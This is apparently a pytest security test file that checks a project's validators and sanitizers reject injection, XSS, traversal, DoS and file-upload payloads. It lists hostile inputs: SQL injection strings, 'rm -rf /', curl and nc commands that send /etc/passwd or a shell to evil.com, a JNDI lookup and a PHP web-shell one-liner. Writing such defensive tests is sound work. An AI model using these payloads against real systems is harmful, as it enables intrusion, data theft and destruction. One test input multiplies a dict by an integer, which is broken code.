"""
Input Validation Security Testing Suite
Comprehensive security tests for input validation and sanitization.
"""

import base64
import json

import pytest
from pydantic import ValidationError

from pynomaly.domain.exceptions import ValidationError as DomainValidationError
from pynomaly.infrastructure.validation import (
    DataSanitizer,
    InputValidator,
    SecurityValidator,
)


class TestInputValidationSecurity:
    """Security tests for input validation systems."""

    @pytest.fixture
    def validator(self):
        """Create input validator for testing."""
        return InputValidator()

    @pytest.fixture
    def sanitizer(self):
        """Create data sanitizer for testing."""
        return DataSanitizer()

    @pytest.fixture
    def security_validator(self):
        """Create security validator for testing."""
        return SecurityValidator()

    # SQL Injection Prevention Tests

    def test_sql_injection_prevention(self, validator):
        """Test prevention of SQL injection attacks."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM passwords --",
            "admin'/**/OR/**/1=1--",
            "'; INSERT INTO users VALUES ('hacker', 'pass'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "1' OR 1=1#",
            "1' OR 1=1/*",
            "' OR 'a'='a",
            "x'; DROP TABLE members; --",
            "1; DELETE FROM users WHERE 1=1; --",
            "'; EXEC sp_configure 'show advanced options', 1; --",
        ]

        for payload in sql_injection_payloads:
            # Test string validation
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_sql_safe_string(payload)

            # Test as username
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_username(payload)

            # Test as email (most should fail format validation too)
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_email(payload)

    def test_nosql_injection_prevention(self, validator):
        """Test prevention of NoSQL injection attacks."""
        nosql_injection_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "this.username == this.password"}',
            '{"$regex": ".*"}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$or": [{"username": "admin"}, {"role": "admin"}]}',
            'true, $where: "this.username == this.password"',
            '{"username": {"$regex": "^admin"}, "password": {"$ne": null}}',
            '{"$expr": {"$eq": ["$username", "$password"]}}',
            '{"username": {"$in": ["admin", "root", "administrator"]}}',
        ]

        for payload in nosql_injection_payloads:
            # Test string validation
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_json_safe_string(payload)

            # Test as search query
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_search_query(payload)

    def test_ldap_injection_prevention(self, validator):
        """Test prevention of LDAP injection attacks."""
        ldap_injection_payloads = [
            "admin)(cn=*",
            "*)(uid=*)(|(uid=*",
            "admin)(&(password=*",
            "*)(&",
            "admin)(|(cn=*))",
            "*)(objectClass=*",
            "admin)(|(objectClass=*))",
            "*)(mail=*@*)(|(mail=*",
            "admin)(&(objectClass=user)(|(cn=*",
            "*))((|(objectClass=*",
        ]

        for payload in ldap_injection_payloads:
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_ldap_safe_string(payload)

    # XSS Prevention Tests

    def test_xss_prevention_in_text_input(self, sanitizer):
        """Test XSS prevention in text inputs."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>",
            "<video><source onerror=alert('xss')>",
            "<audio src=x onerror=alert('xss')>",
            "<details open ontoggle=alert('xss')>",
            "';alert('xss');//",
            "\"><script>alert('xss')</script>",
            "'><img src=x onerror=alert('xss')>",
        ]

        for payload in xss_payloads:
            sanitized = sanitizer.sanitize_html_input(payload)

            # Should not contain dangerous patterns
            dangerous_patterns = [
                "<script",
                "javascript:",
                "onerror",
                "onload",
                "onfocus",
                "ontoggle",
                "alert(",
                "eval(",
                "document.",
                "window.",
                "location.",
            ]

            for pattern in dangerous_patterns:
                assert pattern.lower() not in sanitized.lower()

    def test_xss_prevention_in_json_data(self, sanitizer):
        """Test XSS prevention in JSON data."""
        malicious_json_data = {
            "name": "<script>alert('xss')</script>",
            "description": "'; alert('xss'); //",
            "comment": "<img src=x onerror=alert('xss')>",
            "metadata": {
                "title": "<svg onload=alert('xss')>",
                "content": "javascript:alert('xss')",
            },
        }

        sanitized = sanitizer.sanitize_json_data(malicious_json_data)

        # Recursively check all string values
        def check_sanitized(obj):
            if isinstance(obj, dict):
                for value in obj.values():
                    check_sanitized(value)
            elif isinstance(obj, list):
                for item in obj:
                    check_sanitized(item)
            elif isinstance(obj, str):
                assert "<script" not in obj.lower()
                assert "javascript:" not in obj.lower()
                assert "onerror" not in obj.lower()
                assert "alert(" not in obj.lower()

        check_sanitized(sanitized)

    def test_xss_prevention_in_urls(self, validator):
        """Test XSS prevention in URL validation."""
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "vbscript:msgbox('xss')",
            "javascript://comment%0Alert('xss')",
            "data:text/html;base64,"
            + base64.b64encode(b"<script>alert('xss')</script>").decode(),
            "http://evil.com/redirect?url=javascript:alert('xss')",
            "https://example.com\"><script>alert('xss')</script>",
            "ftp://user:pass@host/path';alert('xss');//",
        ]

        for url in malicious_urls:
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_safe_url(url)

    # Path Traversal Prevention Tests

    def test_path_traversal_prevention(self, validator):
        """Test prevention of path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/var/www/../../etc/passwd",
            "....\\\\....\\\\....\\\\etc\\\\passwd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",
            "file:///etc/passwd",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
        ]

        for payload in path_traversal_payloads:
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_safe_file_path(payload)

    def test_filename_validation_security(self, validator):
        """Test security of filename validation."""
        dangerous_filenames = [
            "../../../etc/passwd",
            "file.php.jpg",  # Double extension
            "normal.pdf.exe",
            ".htaccess",
            "web.config",
            "autorun.inf",
            "desktop.ini",
            "thumbs.db",
            "file\x00.txt",  # Null byte injection
            "file\r\n.txt",  # CRLF injection
            "CON",
            "PRN",
            "AUX",
            "NUL",  # Windows reserved names
            "COM1",
            "COM2",
            "LPT1",
            "LPT2",
            "file name with spaces.exe",
            "very_long_filename_" + "x" * 500 + ".txt",
        ]

        for filename in dangerous_filenames:
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_safe_filename(filename)

    # Command Injection Prevention Tests

    def test_command_injection_prevention(self, validator):
        """Test prevention of command injection attacks."""
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& echo 'hacked'",
            "|| curl http://evil.com",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "${jndi:ldap://evil.com/exploit}",
            "; wget http://evil.com/malware",
            "| nc -e /bin/sh evil.com 4444",
            "&& powershell -EncodedCommand <base64>",
            "; curl -d @/etc/passwd http://evil.com",
            "| tee /etc/passwd",
            "&& echo 'exploit' > /tmp/pwned",
        ]

        for payload in command_injection_payloads:
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_command_safe_string(payload)

    # Data Type Validation Security Tests

    def test_integer_overflow_prevention(self, validator):
        """Test prevention of integer overflow attacks."""
        overflow_values = [
            2**31,  # 32-bit signed int overflow
            2**32,  # 32-bit unsigned int overflow
            2**63,  # 64-bit signed int overflow
            2**64,  # 64-bit unsigned int overflow
            -(2**31) - 1,  # Negative overflow
            float("inf"),  # Infinity
            float("-inf"),  # Negative infinity
            float("nan"),  # Not a number
        ]

        for value in overflow_values:
            with pytest.raises((ValidationError, DomainValidationError, OverflowError)):
                validator.validate_safe_integer(value)

    def test_json_depth_bomb_prevention(self, validator):
        """Test prevention of JSON depth bomb attacks."""
        # Create deeply nested JSON
        deep_json = {}
        current = deep_json
        for i in range(1000):  # Very deep nesting
            current["nested"] = {}
            current = current["nested"]

        json_string = json.dumps(deep_json)

        with pytest.raises((ValidationError, DomainValidationError, RecursionError)):
            validator.validate_json_structure(json_string, max_depth=100)

    def test_json_size_bomb_prevention(self, validator):
        """Test prevention of JSON size bomb attacks."""
        # Create large JSON payload
        large_payload = {
            "data": "x" * (10 * 1024 * 1024)  # 10MB string
        }

        json_string = json.dumps(large_payload)

        with pytest.raises((ValidationError, DomainValidationError)):
            validator.validate_json_size(json_string, max_size_mb=1)

    def test_regex_dos_prevention(self, validator):
        """Test prevention of ReDoS (Regular Expression DoS) attacks."""
        # Patterns that could cause exponential backtracking
        redos_payloads = [
            "a" * 50000 + "X",  # For regex like (a+)+$
            "(" + "a" * 1000 + ")*$",
            "a" * 100 + "b",  # For regex like ^(a+)+$
        ]

        vulnerable_patterns = [
            r"^(a+)+$",
            r"^([a-zA-Z]+)*$",
            r"^(a|a)*$",
            r"^([a-z]*)*$",
        ]

        for payload in redos_payloads:
            for pattern in vulnerable_patterns:
                # Should timeout or reject quickly
                with pytest.raises(
                    (ValidationError, DomainValidationError, TimeoutError)
                ):
                    validator.validate_regex_pattern(
                        payload, pattern, timeout_seconds=1
                    )

    # Email Validation Security Tests

    def test_email_header_injection_prevention(self, validator):
        """Test prevention of email header injection."""
        email_injection_payloads = [
            "test@example.com\nBCC: evil@hacker.com",
            "test@example.com\rSubject: Hacked",
            "test@example.com%0ABcc:evil@hacker.com",
            "test@example.com%0D%0ABcc:evil@hacker.com",
            "test@example.com\n\nThis is injected content",
            "test@example.com\r\n\r\nInjected body",
        ]

        for payload in email_injection_payloads:
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_email(payload)

    def test_email_domain_security(self, validator):
        """Test email domain security validation."""
        suspicious_domains = [
            "test@localhost",
            "test@127.0.0.1",
            "test@[127.0.0.1]",
            "test@internal.domain",
            "test@192.168.1.1",
            "test@10.0.0.1",
            "test@172.16.0.1",
            "test@example.test",  # Reserved TLD
            "test@.com",  # Invalid domain
            "test@com",  # TLD only
        ]

        for email in suspicious_domains:
            # Should either reject or flag as suspicious
            try:
                result = validator.validate_email_domain_security(email)
                assert result is False or "suspicious" in str(result).lower()
            except (ValidationError, DomainValidationError):
                pass  # Expected for invalid formats

    # File Upload Security Tests

    def test_file_content_validation(self, validator):
        """Test file content validation security."""
        # Malicious file contents
        malicious_contents = [
            b"GIF89a\x01\x00\x01\x00\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00\x3b",  # Malformed GIF
            b"\x89PNG\r\n\x1a\n" + b"\x00" * 1000,  # Malformed PNG
            b"PK\x03\x04" + b"\x00" * 1000,  # ZIP bomb start
            b"\xff\xd8\xff\xe0" + b"\x00" * 1000,  # Malformed JPEG
            b"<?php system($_GET['cmd']); ?>",  # PHP backdoor
            b"<script>alert('xss')</script>",  # HTML/JS
            b"\x00" * 10000,  # Null bytes
            b"MZ\x90\x00",  # PE executable header
            b"\x7fELF",  # ELF executable header
        ]

        for content in malicious_contents:
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.validate_file_content_security(
                    content, allowed_types=["image/jpeg", "image/png"]
                )

    def test_file_size_bomb_prevention(self, validator):
        """Test prevention of file size bomb attacks."""
        # Simulate very large file
        large_size = 100 * 1024 * 1024  # 100MB

        with pytest.raises((ValidationError, DomainValidationError)):
            validator.validate_file_size(large_size, max_size_mb=50)

    def test_zip_bomb_prevention(self, validator):
        """Test prevention of zip bomb attacks."""
        # Simulate zip file with high compression ratio
        # In real implementation, this would analyze actual zip structure
        zip_metadata = {
            "compressed_size": 1024,  # 1KB
            "uncompressed_size": 100 * 1024 * 1024,  # 100MB
            "compression_ratio": 100000,
            "file_count": 1000000,  # Excessive file count
        }

        with pytest.raises((ValidationError, DomainValidationError)):
            validator.validate_archive_security(zip_metadata)

    # Unicode and Encoding Security Tests

    def test_unicode_normalization_attacks(self, validator):
        """Test prevention of Unicode normalization attacks."""
        # Unicode characters that could cause issues
        unicode_attacks = [
            "admin\u202e",  # Right-to-left override
            "admin\u200b",  # Zero-width space
            "admin\u200c",  # Zero-width non-joiner
            "admin\u200d",  # Zero-width joiner
            "admin\ufeff",  # Zero-width no-break space
            "admin\u2060",  # Word joiner
            "\u0041\u0301",  # Á (combining character)
            "\u1e00",  # Ḁ (precomposed)
            "test\u0000user",  # Null character
            "admin\u0020\u0020",  # Multiple spaces
        ]

        for attack in unicode_attacks:
            normalized = validator.normalize_unicode_safely(attack)

            # Should handle dangerous Unicode safely
            assert "\u202e" not in normalized  # RTL override removed
            assert "\u0000" not in normalized  # Null bytes removed
            assert len(normalized.strip()) > 0  # Not just whitespace

    def test_encoding_confusion_prevention(self, validator):
        """Test prevention of encoding confusion attacks."""
        # Different encodings of same logical string
        encoding_variants = [
            "admin",  # ASCII
            b"admin".decode("utf-8"),  # UTF-8
            "admin".encode("utf-16").decode("utf-16"),  # UTF-16
            "admin".encode("latin1").decode("latin1"),  # Latin-1
        ]

        # All should normalize to same canonical form
        canonical_forms = [
            validator.canonicalize_string(variant) for variant in encoding_variants
        ]

        # All canonical forms should be identical
        assert len(set(canonical_forms)) == 1

    # Timing Attack Prevention Tests

    def test_constant_time_string_comparison(self, validator):
        """Test constant-time string comparison for security."""
        import time

        # Test strings of different lengths and contents
        test_pairs = [
            ("secret123", "secret123"),  # Identical
            ("secret123", "secret124"),  # Different last char
            ("secret123", "public123"),  # Different first part
            ("secret123", "short"),  # Different lengths
            ("secret123", "very_long_string_here"),  # Very different lengths
        ]

        timings = []
        for str1, str2 in test_pairs:
            start = time.perf_counter()
            result = validator.constant_time_compare(str1, str2)
            end = time.perf_counter()
            timings.append(end - start)

            # Verify correctness
            expected = str1 == str2
            assert result == expected

        # All timings should be similar (within 50% variance)
        avg_time = sum(timings) / len(timings)
        for timing in timings:
            variance = abs(timing - avg_time) / avg_time
            assert variance < 0.5  # Less than 50% variance

    # Data Sanitization Security Tests

    def test_html_sanitization_bypass_prevention(self, sanitizer):
        """Test prevention of HTML sanitization bypasses."""
        bypass_attempts = [
            "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
            "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
            "<img src=\"javascript:alert('XSS')\">",
            "<img src=javascript:alert('XSS')>",
            "<img src=JaVaScRiPt:alert('XSS')>",
            "<img src=\x14javascript:alert('XSS')>",
            "<img src=javascript:alert&lpar;'XSS'&rpar;>",
        ]

        for attempt in bypass_attempts:
            sanitized = sanitizer.sanitize_html_strict(attempt)

            # Should not contain JavaScript
            assert "javascript:" not in sanitized.lower()
            assert "alert(" not in sanitized.lower()
            assert "onerror" not in sanitized.lower()
            # Should be safe HTML or empty
            assert "<script" not in sanitized.lower()

    def test_css_injection_prevention(self, sanitizer):
        """Test prevention of CSS injection attacks."""
        css_injection_attempts = [
            "color: expression(alert('XSS'))",
            "background: url('javascript:alert(1)')",
            "background-image: url(javascript:alert('XSS'))",
            "@import 'javascript:alert(\"XSS\")'",
            "behavior: url(xss.htc)",
            "-moz-binding: url(http://evil.com/xss.xml#xss)",
            "color: red; background: url('data:text/html,<script>alert(1)</script>')",
        ]

        for css_code in css_injection_attempts:
            sanitized = sanitizer.sanitize_css_properties(css_code)

            # Should remove dangerous CSS
            assert "javascript:" not in sanitized.lower()
            assert "expression(" not in sanitized.lower()
            assert "behavior:" not in sanitized.lower()
            assert "-moz-binding:" not in sanitized.lower()
            assert "data:text/html" not in sanitized.lower()

    def test_json_sanitization_security(self, sanitizer):
        """Test JSON sanitization security."""
        malicious_json = {
            "__proto__": {"admin": True},  # Prototype pollution
            "constructor": {"prototype": {"admin": True}},
            "toString": "function() { alert('XSS'); }",
            "valueOf": "() => { alert('XSS'); }",
            "eval": "malicious code here",
            "Function": "constructor",
            "process": {"env": "SECRET_KEY"},
        }

        sanitized = sanitizer.sanitize_json_object(malicious_json)

        # Should remove dangerous properties
        dangerous_keys = [
            "__proto__",
            "constructor",
            "toString",
            "valueOf",
            "eval",
            "Function",
            "process",
        ]

        for key in dangerous_keys:
            assert key not in sanitized

    # Rate Limiting and DoS Prevention

    def test_input_rate_limiting(self, validator):
        """Test input rate limiting for DoS prevention."""
        # Simulate rapid input validation requests
        user_ip = "192.168.1.100"

        # First few requests should pass
        for i in range(5):
            result = validator.check_validation_rate_limit(user_ip)
            assert result is True

        # Subsequent requests should be rate limited
        for i in range(5):
            with pytest.raises((ValidationError, DomainValidationError)):
                validator.check_validation_rate_limit(user_ip)

    def test_computational_dos_prevention(self, validator):
        """Test prevention of computational DoS attacks."""
        # Expensive operations should be limited
        expensive_inputs = [
            "a" * 1000000,  # Very long string
            {"nested": {"very": {"deep": {"structure": "here"}} * 100}},  # Deep nesting
            list(range(100000)),  # Large list
        ]

        for expensive_input in expensive_inputs:
            with pytest.raises((ValidationError, DomainValidationError, TimeoutError)):
                validator.validate_with_resource_limits(
                    expensive_input, max_size=10000, timeout_seconds=1
                )
